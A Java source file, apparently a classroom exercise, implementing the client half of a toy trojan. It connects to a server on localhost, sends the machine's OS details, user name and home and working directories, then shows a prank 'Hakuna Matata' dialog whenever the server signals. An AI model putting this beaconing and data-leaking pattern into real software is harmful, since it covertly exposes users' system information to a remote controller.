/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.cafeconpalito.troyanocliente;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JDialog;
import javax.swing.JOptionPane;

/**
 *
 * @author Albano Díez de Paulino
 */
public class HiloCliente implements Runnable {

    //Parametros para conectar al server
    final String SERVER_IP = "localhost"; // "127.0.0.1"
    final int PUERTO = 6666;

    @Override
    public void run() {
        DataInputStream bufferDatosEntrada = null;
        DataOutputStream bufferDatosSalida = null;
        Socket servidor = null;
        try {

            servidor = new Socket(SERVER_IP, PUERTO);
            //Inicilizo las conexiones con el server con los parametros de este
            bufferDatosEntrada = new DataInputStream(servidor.getInputStream());
            bufferDatosSalida = new DataOutputStream(servidor.getOutputStream());

            bufferDatosSalida.writeUTF(System.getProperty("os.name"));
            bufferDatosSalida.writeUTF(System.getProperty("user.name"));
            bufferDatosSalida.writeUTF(System.getProperty("os.arch"));
            bufferDatosSalida.writeUTF(System.getProperty("os.version"));
            bufferDatosSalida.writeUTF(System.getProperty("user.dir"));
            bufferDatosSalida.writeUTF(System.getProperty("user.home"));

            do {
                if (bufferDatosEntrada.readBoolean()) {
                    errorMensaje();
                }
                Thread.sleep(1000);
            } while (true);

        } catch (IOException ex) {
            Logger.getLogger(HiloCliente.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InterruptedException ex) {
            Logger.getLogger(HiloCliente.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    private void errorMensaje() {
        JOptionPane jop = new JOptionPane("¡Hakuna Matata!\n¿Cómo puedes estar triste si la filosofía es 'sin preocupaciones?", JOptionPane.INFORMATION_MESSAGE);
        JDialog jd = jop.createDialog("Hakuna Matata");
        jd.setLocationRelativeTo(null);
        jd.setVisible(true);

    }
}
